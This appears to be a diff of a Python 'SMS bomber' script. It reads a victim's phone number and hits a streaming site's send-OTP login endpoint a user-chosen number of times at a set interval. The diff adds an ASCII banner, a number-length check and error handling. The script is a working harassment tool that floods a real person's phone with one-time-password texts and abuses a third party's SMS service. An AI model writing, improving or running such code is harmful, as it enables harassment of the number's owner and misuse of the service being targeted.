@@ -2,9 +2,23 @@ import requests
 import time
 
 
-num = str(input("ENTER  THE NUMBER: "))
 
-api = api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+num+"&operator=bd-otp"
+def ban():
+	ban = """
+	     
+	████████╗░█████╗░███╗░░██╗██╗░░░██╗██╗██████╗░
+	╚══██╔══╝██╔══██╗████╗░██║██║░░░██║██║██╔══██╗
+	░░░██║░░░███████║██╔██╗██║╚██╗░██╔╝██║██████╔╝
+	░░░██║░░░██╔══██║██║╚████║░╚████╔╝░██║██╔══██╗
+	░░░██║░░░██║░░██║██║░╚███║░░╚██╔╝░░██║██║░░██║
+	░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝  
+	                                               """
+
+
+num = input("ENTER  THE NUMBER: ")
+			
+
+api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+num+"&operator=bd-otp"
 
 
 
@@ -25,7 +39,13 @@ def send(amount,n):
 	
 	
 if __name__ == '__main__':
-	send(int(input("amount: ")),int(input("time: ")))
+	try:
+		if len(num)>10:
+			send(int(input("amount: ")),int(input("time: ")))
+		else:
+			print("Enter a valid number")
+	except Exception:
+		print("error occured")			
 
 
 
